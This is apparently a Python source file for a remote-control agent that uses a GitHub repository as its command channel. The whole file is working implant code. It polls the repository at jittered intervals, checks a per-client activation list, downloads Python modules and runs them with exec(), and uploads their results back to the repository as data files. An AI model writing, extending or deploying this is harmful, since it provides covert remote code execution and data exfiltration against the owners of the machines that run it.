import os
import json
import time
import random
import uuid
import base64
import importlib.util
import requests
from datetime import datetime


class GitHubConnector:
    def __init__(self, repo_owner, repo_name, token):
        self.base_url = f"https://api.github.com/repos/{repo_owner}/{repo_name}"
        self.headers = {"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"}
    
    def get_file(self, path):
        try:
            r = requests.get(f"{self.base_url}/contents/{path}", headers=self.headers, timeout=10)
            if r.status_code == 404:
                print(f"[GitHub] File not found: {path}")
                return None
            if r.status_code != 200:
                print(f"[GitHub] Error {r.status_code}: {r.text[:100]}")
                return None
            data = r.json()
            if data.get("encoding") == "base64":
                return base64.b64decode(data["content"]).decode("utf-8")
            return data.get("content", "")
        except Exception as e:
            print(f"[GitHub] Error fetching {path}: {e}")
            return None
    
    def upload_file(self, path, content):
        try:
            sha = None
            try:
                r = requests.get(f"{self.base_url}/contents/{path}", headers=self.headers, timeout=10)
                if r.status_code == 200:
                    sha = r.json().get("sha")
            except:
                pass
            
            data = {
                "message": "Data upload",
                "content": base64.b64encode(content.encode("utf-8")).decode("utf-8"),
                "branch": "main"
            }
            if sha:
                data["sha"] = sha
            
            requests.put(f"{self.base_url}/contents/{path}", headers=self.headers, json=data, timeout=10)
            return True
        except:
            return False
    
    def get_config(self):
        content = self.get_file("config/config.json")
        if not content:
            print("[GitHub] config/config.json not found in repository")
            print("[GitHub] Make sure the file exists at: config/config.json")
            return None
        try:
            return json.loads(content)
        except Exception as e:
            print(f"[GitHub] Invalid JSON in config: {e}")
            return None


class ModuleLoader:
    def __init__(self, github, client_id):
        self.github = github
        self.client_id = client_id
        self.cache = {}
    
    def load_module(self, name):
        if name in self.cache:
            return self.cache[name]

        try:
            if os.path.exists(f"modules/{name}.py"):
                print(f"[Loader] Loading {name} from local filesystem")
                spec = importlib.util.spec_from_file_location(name, f"modules/{name}.py")
                if spec and spec.loader:
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)
                    self.cache[name] = module
                    return module
        except Exception as e:
            print(f"[Loader] Failed to load {name} locally: {e}")

        try:
            print(f"[Loader] Loading {name} from GitHub...")
            code = self.github.get_file(f"modules/{name}.py")
            if code:
                spec = importlib.util.spec_from_loader(name, loader=None)
                module = importlib.util.module_from_spec(spec)
                exec(code, module.__dict__)
                self.cache[name] = module
                print(f"[Loader] Loaded {name} from GitHub")
                return module
        except Exception as e:
            print(f"[Loader] Failed to load {name} from GitHub: {e}")
        
        print(f"[Loader] Module {name} not found")
        return None
    
    def execute(self, name, config):
        module = self.load_module(name)
        if module and hasattr(module, "execute"):
            try:
                return module.execute(config, self.client_id)
            except:
                pass
        return None


class Agent:
    def __init__(self, repo_owner, repo_name, token, client_id=None):
        self.client_id = client_id or str(uuid.uuid4())
        self.github = GitHubConnector(repo_owner, repo_name, token)
        self.loader = ModuleLoader(self.github, self.client_id)
        self.interval = random.randint(30, 60)
    
    def poll_interval(self):
        return max(5, self.interval + random.uniform(-10, 10))
    
    def upload_result(self, module_name, result):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"data/{self.client_id}_{module_name}_{timestamp}.json"
        content = json.dumps({"client_id": self.client_id, "module": module_name, "timestamp": timestamp, "result": result}, indent=2)
        return self.github.upload_file(filename, content)
    
    def run(self):
        print(f"[Agent] Started - Client ID: {self.client_id}")
        while True:
            try:
                print("[Agent] Fetching config from GitHub...")
                config = self.github.get_config()
                if not config:
                    print("[Agent] No config found, waiting...")
                    time.sleep(self.poll_interval())
                    continue
                
                active = config.get("active_clients", [])
                if active and self.client_id not in active:
                    print(f"[Agent] Client {self.client_id} not in active list, waiting...")
                    time.sleep(self.poll_interval())
                    continue
                
                modules = config.get("modules", [])
                if not modules:
                    print("[Agent] No modules to execute, waiting...")
                    time.sleep(self.poll_interval())
                    continue
                
                print(f"[Agent] Found {len(modules)} module(s) to execute")
                for m in modules:
                    name = m.get("name")
                    if name:
                        print(f"[Agent] Executing module: {name}")
                        result = self.loader.execute(name, m)
                        if result:
                            print(f"[Agent] Module {name} completed")
                            if self.upload_result(name, result):
                                print(f"[Agent] Results uploaded for {name}")
                            else:
                                print(f"[Agent] Failed to upload results for {name}")
                
                sleep_time = self.poll_interval()
                print(f"[Agent] Waiting {sleep_time:.1f}s before next poll...")
                time.sleep(sleep_time)
            except KeyboardInterrupt:
                print("\n[Agent] Stopped by user")
                break
            except Exception as e:
                print(f"[Agent] Error: {e}")
                time.sleep(self.poll_interval())


def main():
    if os.path.exists("agent_config.json"):
        with open("agent_config.json", "r") as f:
            cfg = json.load(f)
            repo_owner = cfg.get("repo_owner")
            repo_name = cfg.get("repo_name")
            token = cfg.get("github_token")
            client_id = cfg.get("client_id")
    else:
        print("Create agent_config.json with repo_owner, repo_name, github_token")
        return
    
    if not all([repo_owner, repo_name, token]):
        print("Missing configuration")
        return
    
    agent = Agent(repo_owner, repo_name, token, client_id)
    agent.run()


if __name__ == "__main__":
    main()

